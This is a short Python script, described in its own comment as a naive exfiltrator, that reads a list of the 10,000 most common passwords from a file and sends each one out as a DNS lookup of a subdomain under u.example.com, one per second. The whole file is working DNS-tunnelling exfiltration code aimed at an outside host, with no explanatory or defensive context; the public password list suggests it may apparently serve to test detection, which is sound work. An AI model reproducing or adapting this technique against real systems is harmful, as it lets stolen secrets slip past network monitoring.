#!/usr/bin/env python3

# A naive exfiltrator that exfiltrates top passwords

import socket
from time import sleep


def exfiltrate(info):
    try:
        _ = socket.getaddrinfo(f"{info}.u.example.com", 0)
    except Exception as e:
        print(f"\nFailed to exfiltrate {info}: {e}")
        pass


def main():
    with open("Pwdb_top-10000.txt") as f:
        passwds = f.readlines()
    for passwd in passwds:
        exfiltrate(passwd.strip())
        print('.', end='', flush=True)
        sleep(1)

if __name__ == '__main__':
    main()
